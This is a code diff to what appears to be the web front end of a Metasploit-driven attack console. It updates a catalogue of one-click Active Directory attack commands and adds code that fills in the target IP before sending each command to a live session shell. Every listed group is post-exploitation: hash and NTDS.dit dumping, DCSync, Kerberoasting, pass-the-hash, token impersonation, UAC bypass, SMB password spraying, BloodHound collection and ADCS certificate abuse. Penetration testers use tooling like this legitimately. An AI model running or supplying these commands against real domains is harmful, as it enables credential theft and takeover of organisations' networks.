@@ -556,72 +556,72 @@ const AD_GROUPS: ADGroup[] = [
   {
     label: 'Domain Enumeration',
     cmds: [
-      { label: 'Enum domain info',       cmd: 'run post/windows/gather/enum_domain' },
-      { label: 'Enum domain users',      cmd: 'run post/windows/gather/enum_ad_users' },
-      { label: 'Enum domain groups',     cmd: 'run post/windows/gather/enum_ad_groups' },
-      { label: 'Enum domain computers',  cmd: 'run post/windows/gather/enum_ad_computers' },
-      { label: 'Enum domain controllers',cmd: 'run post/windows/gather/enum_domain_group_users GROUP="Domain Controllers"' },
-      { label: 'Enum logged-on users',   cmd: 'run post/windows/gather/enum_logged_on_users' },
+      { label: 'Enum domain info',        cmd: 'use post/windows/gather/enum_domain\nrun' },
+      { label: 'Enum domain users',       cmd: 'use post/windows/gather/enum_ad_users\nrun' },
+      { label: 'Enum domain groups',      cmd: 'use post/windows/gather/enum_ad_groups\nrun' },
+      { label: 'Enum domain computers',   cmd: 'use post/windows/gather/enum_ad_computers\nrun' },
+      { label: 'Enum domain controllers', cmd: 'use post/windows/gather/enum_domain_group_users\nset GROUP "Domain Controllers"\nrun' },
+      { label: 'Enum logged-on users',    cmd: 'use post/windows/gather/enum_logged_on_users\nrun' },
     ],
   },
   {
     label: 'Credential Attacks',
     cmds: [
-      { label: 'Dump hashes (hashdump)', cmd: 'hashdump' },
-      { label: 'Dump hashes (smart)',    cmd: 'run post/windows/gather/smart_hashdump GETSYSTEM=true' },
-      { label: 'Kerberoast (GetUserSPNs)',cmd: 'run post/windows/gather/kerberoast' },
-      { label: 'AS-REP Roast',           cmd: 'run post/windows/gather/get_np_users' },
-      { label: 'DCSync (secret dump)',   cmd: 'run post/windows/gather/credentials/credential_collector' },
-      { label: 'Dump NTDS.dit',          cmd: 'run post/windows/gather/ntds_grabber' },
+      { label: 'Dump hashes (hashdump)',  cmd: 'hashdump' },
+      { label: 'Dump hashes (smart)',     cmd: 'use post/windows/gather/smart_hashdump\nset GETSYSTEM true\nrun' },
+      { label: 'Kerberoast (GetUserSPNs)',cmd: 'use post/windows/gather/kerberoast\nrun' },
+      { label: 'AS-REP Roast',            cmd: 'use post/windows/gather/get_np_users\nrun' },
+      { label: 'DCSync (secret dump)',    cmd: 'use post/windows/gather/credentials/credential_collector\nrun' },
+      { label: 'Dump NTDS.dit',           cmd: 'use post/windows/gather/ntds_grabber\nrun' },
     ],
   },
   {
     label: 'Lateral Movement',
     cmds: [
-      { label: 'Pass-the-Hash (PTH)',    cmd: 'use exploit/windows/smb/psexec\nset SMBPass <NTLM_HASH>\nrun' },
-      { label: 'List SMB shares',        cmd: 'run post/windows/gather/enum_shares' },
-      { label: 'Enum network shares',    cmd: 'shell net view /all /domain' },
-      { label: 'Current token',          cmd: 'getuid' },
-      { label: 'List tokens',            cmd: 'use incognito\nlist_tokens -u' },
-      { label: 'Impersonate token',      cmd: 'impersonate_token "DOMAIN\\\\Administrator"' },
+      { label: 'Pass-the-Hash (PTH)',     cmd: 'use exploit/windows/smb/psexec\nset RHOSTS <IP>\nset SMBPass <NTLM_HASH>\nrun' },
+      { label: 'List SMB shares',         cmd: 'use post/windows/gather/enum_shares\nrun' },
+      { label: 'Enum network shares',     cmd: 'shell net view /all /domain' },
+      { label: 'Current token',           cmd: 'getuid' },
+      { label: 'List tokens',             cmd: 'use incognito\nlist_tokens -u' },
+      { label: 'Impersonate token',       cmd: 'impersonate_token "DOMAIN\\\\Administrator"' },
     ],
   },
   {
     label: 'Privilege Escalation',
     cmds: [
-      { label: 'Get SYSTEM',             cmd: 'getsystem' },
-      { label: 'Check privs',            cmd: 'run post/multi/recon/local_exploit_suggester' },
-      { label: 'Enum GPO / SYSVOL',      cmd: 'run post/windows/gather/credentials/gpp' },
-      { label: 'Check AlwaysInstallElev',cmd: 'shell reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },
-      { label: 'Bypass UAC',             cmd: 'use exploit/windows/local/bypassuac_injection\nrun' },
+      { label: 'Get SYSTEM',              cmd: 'getsystem' },
+      { label: 'Check privs',             cmd: 'use post/multi/recon/local_exploit_suggester\nrun' },
+      { label: 'Enum GPO / SYSVOL',       cmd: 'use post/windows/gather/credentials/gpp\nrun' },
+      { label: 'Check AlwaysInstallElev', cmd: 'shell reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },
+      { label: 'Bypass UAC',              cmd: 'use exploit/windows/local/bypassuac_injection\nrun' },
     ],
   },
   {
     label: 'BloodHound Collection',
     cmds: [
-      { label: 'Upload SharpHound',      cmd: 'upload /path/to/SharpHound.exe C:\\\\Windows\\\\Temp\\\\SharpHound.exe' },
-      { label: 'Run SharpHound (all)',    cmd: 'shell C:\\\\Windows\\\\Temp\\\\SharpHound.exe -c All --zipfilename bh_out.zip' },
-      { label: 'Download results',       cmd: 'download C:\\\\Windows\\\\Temp\\\\bh_out.zip' },
+      { label: 'Upload SharpHound',       cmd: 'upload /path/to/SharpHound.exe C:\\\\Windows\\\\Temp\\\\SharpHound.exe' },
+      { label: 'Run SharpHound (all)',     cmd: 'shell C:\\\\Windows\\\\Temp\\\\SharpHound.exe -c All --zipfilename bh_out.zip' },
+      { label: 'Download results',        cmd: 'download C:\\\\Windows\\\\Temp\\\\bh_out.zip' },
     ],
   },
   {
     label: 'LDAP Enumeration',
     cmds: [
-      { label: 'LDAP base query (anon)',  cmd: 'shell ldapsearch -x -H ldap://<IP> -b "" -s base namingContexts' },
-      { label: 'Enum users (anon)',       cmd: 'shell ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName' },
-      { label: 'Enum groups (anon)',      cmd: 'shell ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=group)" cn' },
-      { label: 'Enum computers (anon)',   cmd: 'shell ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=computer)" name' },
-      { label: 'MSF LDAP all objects',    cmd: 'use auxiliary/gather/ldap_query\nset ACTION ENUM_ALL_OBJECT_CATEGORY_COMPUTER\nrun' },
-      { label: 'MSF LDAP users',         cmd: 'use auxiliary/gather/ldap_query\nset ACTION ENUM_ACCOUNTS\nrun' },
+      { label: 'LDAP base query (anon)',   cmd: 'shell ldapsearch -x -H ldap://<IP> -b "" -s base namingContexts' },
+      { label: 'Enum users (anon)',        cmd: 'shell ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName' },
+      { label: 'Enum groups (anon)',       cmd: 'shell ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=group)" cn' },
+      { label: 'Enum computers (anon)',    cmd: 'shell ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=computer)" name' },
+      { label: 'MSF LDAP all objects',     cmd: 'use auxiliary/gather/ldap_query\nset RHOSTS <IP>\nset ACTION ENUM_ALL_OBJECT_CATEGORY_COMPUTER\nrun' },
+      { label: 'MSF LDAP users',          cmd: 'use auxiliary/gather/ldap_query\nset RHOSTS <IP>\nset ACTION ENUM_ACCOUNTS\nrun' },
     ],
   },
   {
     label: 'SMB / RPC Enumeration',
     cmds: [
-      { label: 'Enum shares',             cmd: 'run auxiliary/scanner/smb/smb_enumshares' },
-      { label: 'Enum users via RPC',      cmd: 'run auxiliary/scanner/smb/smb_enumusers' },
-      { label: 'Check EternalBlue',       cmd: 'run auxiliary/scanner/smb/smb_ms17_010' },
-      { label: 'SMB password spray',      cmd: 'run auxiliary/scanner/smb/smb_login PASS_FILE=/usr/share/wordlists/fasttrack.txt' },
+      { label: 'Enum shares',             cmd: 'use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS <IP>\nrun' },
+      { label: 'Enum users via RPC',      cmd: 'use auxiliary/scanner/smb/smb_enumusers\nset RHOSTS <IP>\nrun' },
+      { label: 'Check EternalBlue',       cmd: 'use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS <IP>\nrun' },
+      { label: 'SMB password spray',      cmd: 'use auxiliary/scanner/smb/smb_login\nset RHOSTS <IP>\nset PASS_FILE /usr/share/wordlists/fasttrack.txt\nrun' },
       { label: 'enum4linux full sweep',   cmd: 'shell enum4linux -a <IP>' },
       { label: 'enum4linux-ng full',      cmd: 'shell enum4linux-ng -A <IP>' },
       { label: 'SMB null session test',   cmd: 'shell smbclient -N -L //<IP>' },
@@ -631,11 +631,11 @@ const AD_GROUPS: ADGroup[] = [
   {
     label: 'Certificate Attacks (ADCS)',
     cmds: [
-      { label: 'Enum ADCS templates',     cmd: 'run post/windows/gather/enum_adcs' },
+      { label: 'Enum ADCS templates',     cmd: 'use post/windows/gather/enum_adcs\nrun' },
       { label: 'Check ADCS endpoint',     cmd: 'shell certutil -config - -ping' },
       { label: 'List CA templates (shell)',cmd: 'shell certutil -catemplates' },
-      { label: 'MSF ESC1 cert request',   cmd: 'use auxiliary/admin/dcerpc/icpr_cert\nrun' },
-      { label: 'Enum CAs (MSF)',          cmd: 'use auxiliary/gather/ldap_query\nset ACTION ENUM_ALL_PKIENVELOPE\nrun' },
+      { label: 'MSF ESC1 cert request',   cmd: 'use auxiliary/admin/dcerpc/icpr_cert\nset RHOSTS <IP>\nrun' },
+      { label: 'Enum CAs (MSF)',          cmd: 'use auxiliary/gather/ldap_query\nset RHOSTS <IP>\nset ACTION ENUM_ALL_PKIENVELOPE\nrun' },
     ],
   },
 ];
@@ -739,8 +739,10 @@ function ActiveDirectoryPanel({ sessionId, targetHost }: { sessionId: number; ta
   const runCmd = async (cmd: string) => {
     setRunning(true);
     setOutput('');
+    // Substitute <IP> placeholder with the actual target host
+    const resolved = cmd.replace(/<IP>/g, targetHost);
     try {
-      const res = await axios.post(`/api/sessions/${sessionId}/shell`, { command: cmd });
+      const res = await axios.post(`/api/sessions/${sessionId}/shell`, { command: resolved });
       setOutput(res.data.output || '(no output)');
     } catch (err: any) {
       setOutput(err.response?.data?.error || err.message || 'Error');
